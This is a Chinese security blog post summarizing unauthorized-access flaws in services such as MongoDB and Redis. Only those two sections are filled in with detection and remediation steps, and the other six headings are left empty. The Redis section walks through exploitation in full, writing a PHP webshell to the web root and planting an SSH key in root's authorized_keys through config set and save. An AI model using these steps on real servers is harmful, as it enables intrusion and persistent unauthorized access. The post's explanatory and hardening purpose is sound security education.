---
layout: post_layout
title: 未授权访问漏洞总结
time: 2019年07月02日 星期二
location: 杭州
pulished: true
excerpt_separator: "常见的未授权访问漏洞："
---
之前因为毕设毕业答辩毕业典礼之类的事儿耽搁了博客更新。不过总算是毕业了，太不容易了[捂脸]。当初想借着上一篇的余热总结一下常见的未授权漏洞的，结果一拖就拖了一个多月，都已经拖凉了。。

未授权访问漏洞可以理解为需要安全配置或权限认证的地址、授权页面存在缺陷，导致其他用户可以直接访问，从而引发重要权限可被操作、数据库或网站目录等敏感信息泄露。

常见的未授权访问漏洞：

1. MongoDB 未授权访问漏洞

2. Redis 未授权访问漏洞

3. Memcached 未授权访问漏洞（CVE-2013-7239）

4. JBOSS 未授权访问漏洞

5. VNC 未授权访问漏洞

6. Docker 未授权访问漏洞

7. ZooKeeper 未授权访问漏洞

8. Rsync 未授权访问漏洞

### 1 MongoDB 未授权访问漏洞

#### 漏洞信息

(1) 漏洞简述：开启 MongoDB 服务时若不添加任何参数，默认是没有权限验证的，而且可以远程访问数据库，登录的用户无需密码即可通过默认端口 **27017** 对数据库进行增、删、改、查等高危操作。刚安装完毕时，MongoDB 都默认有一个 admin 数据库，此时 admin 数据库为空，没有记录权限相关的信息。当 admin.system.users 一个用户都没有时，即使 MongoDB 启动时添加了 -auth 参数，还是可以做任何操作（不管是否以 -auth 参数启动），直到在 admin.system.users 中添加了一个用户。

(2) 风险等级：高风险。

(3) 漏洞编号：无。

(4) 影响范围：MongoDB 数据库。

#### 检测方法

可以自己编制相应脚本或利用专用工具检测，也可以查看配置文件：

(1) 检测是否仅监听 127.0.0.1：

```
--bind_ip 127.0.0.1
or
vim /etc/mongodb.conf
bind_ip = 127.0.0.1
```

(2) 检测是否开启 auth 认证：

```
mongod --auth
or
vim /etc/mongodb.conf
auth = true
```

#### 修复方法

(1) 为 MongoDB 添加认证：

① MongoDB 启动时添加 -auth 参数。

② 给 MongoDB 添加用户：

```
use admin # 使用 admin 库；
db.addUser（“用户名” “密码”）# 添加用户名、密码；
db.auth（“用户名”,“密码”）# 验证是否添加成功，返回 1 说明成功。
```

(2) 禁用 HTTP 和 REST 端口：

MongoDB 自身带有一个 HTTP 服务并支持 REST 接口。在 2.6 版本以后这些接口默认关闭。MongoDB 默认会使用默认端口监听 Web 服务，一般不需要通过 Web 方式进行远程管理，建议禁用。修改配置文件或在启动时选择 -nohttpinterface 参数 nohttpinterface = false。

(3) 限制绑定 IP：

启动时加入参数：`--bind_ip 127.0.0.1` ；或在 /etc/mongodb.conf 文件中添加以下内容：`bind_ip = 127.0.0.1` 。

### 2 Redis 未授权访问漏洞

#### 漏洞信息

(1) 漏洞简述：Redis 是一个高性能的 Key - Value 数据库。Redis 的出现很大程度上弥补了 memcached 这类 Key/Value 存储的不足，在部分场合可以对关系数据库起到很好的补充作用。Redis 默认情况下，会绑定在 0.0.0.0:**6379**，这样会将 Redis 服务暴露到公网上。在没有开启认证的情况下，会导致任意用户在可以访问目标服务器的情况下未经授权就访问到 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下可以利用 Redis 的相关方法，成功地在 Redis 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器。

(2) 风险等级：高风险。

(3) 漏洞编号：无。

(4) 影响范围：Redis 数据库。

#### 检测方法

先用 nmap 扫描，查看端口开放情况，发现开放的 6379 端口为 Redis 的默认端口：

`Nmap -A -p 6379 -script redis-info 192.168.10.153`

Nmap 扫描后发现主机的 6379 端口对外开放，可以通过 Redis 客户端进行连接，测试是否存在未授权访问漏洞，具体命令如下：

```
./redis-cli -h 192.168.10.153
Info
```

就可以看到 Redis 的版本和服务器上内核的版本信息，也可以 del key 删除数据，在网站写入木马，写入 SSH 公钥，或者在 crontab 里写定时任务，反弹 shell 等。

(1) 网站写码：

① 先用客户端连接服务器的 redis 服务：`redis-cli.exe -h 目标IP`。

② 连接后设置目录：`config set dir /var/www/html（此路径是服务器端 Web 网站的目录）`。

③ 设置要写入的文件名：`config set dbfilename redis88.php`。

④ 设置要写入的内容：`set webshell "<?php @eval($_POST['123']); ?>"`。

⑤ 保存：`save`。

⑥ 保存后用菜刀连接此木马得到 webshell。

(2) 结合 SSH 免密码登录：

① 先在本地建个 ssh 的密钥：`ssh-keygen-trsa`。

② 将公钥的内容写到一个文本中，命令如下：`(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > test.txt`。

注意：写到文件中时一定要在前面加几行后面加几行。

③ 将里面的内容写入远程的 Redis 服务器上，并且设置其 Key 为 test，命令如下：

`cat test.txt | redis -cli -h <hostname> -x set test`。

④ 登录远程服务器，可以看到公钥已经添加到 Redis 的服务器上了，命令如下：

```
redis-cli -h <hostname>
keys *
get test
```
⑤ 随后就是最关键的了，Redis 有个 save 命令：save 命令执行一个同步保存操作，将当前 Redis 实例的所有数据快照（snapshot）以 RDB 文件的形式保存到硬盘。所以，save 命令就可以将 test 里的公钥保存到 /root/.ssh 下（要有权限）。

修改保存的路径为 `config set dir "/root/.ssh"`，修改文件名为 `config set dbfilename "authorized_keys"`，保存。

⑥ 测试一下：`ssh 用户名@<IP地址>`，实现免密码成功登陆。

#### 修复方法

(1) 设置 Redis 访问密码，在 redis.conf 中找到 "requirepass" 字段，在后面填上强口令，redis 客户端也需要此密码来访问 redis 服务。

(2) 配置 bind 选项，限定可以连接 Reids 服务器的 IP，并修改默认端口 6379。

(3) 重启 Redis 服务。

(4) 清理系统中存在的后门木马。

### 3 Memcached 未授权访问漏洞（CVE-2013-7239）

#### 漏洞信息

(1) 漏洞简述：

(2) 风险等级：高风险。

(3) 漏洞编号：无。

(4) 影响范围：

#### 检测方法



#### 修复方法



### 4 JBOSS 未授权访问漏洞

#### 漏洞信息

(1) 漏洞简述：

(2) 风险等级：高风险。

(3) 漏洞编号：无。

(4) 影响范围：

#### 检测方法



#### 修复方法



### 5 VNC 未授权访问漏洞

#### 漏洞信息

(1) 漏洞简述：

(2) 风险等级：高风险。

(3) 漏洞编号：无。

(4) 影响范围：

#### 检测方法



#### 修复方法



### 6 Docker 未授权访问漏洞

#### 漏洞信息

(1) 漏洞简述：

(2) 风险等级：高风险。

(3) 漏洞编号：无。

(4) 影响范围：

#### 检测方法



#### 修复方法



### 7 ZooKeeper 未授权访问漏洞

#### 漏洞信息

(1) 漏洞简述：

(2) 风险等级：高风险。

(3) 漏洞编号：无。

(4) 影响范围：

#### 检测方法



#### 修复方法



### 8 Rsync 未授权访问漏洞

#### 漏洞信息

(1) 漏洞简述：

(2) 风险等级：高风险。

(3) 漏洞编号：无。

(4) 影响范围：

#### 检测方法



#### 修复方法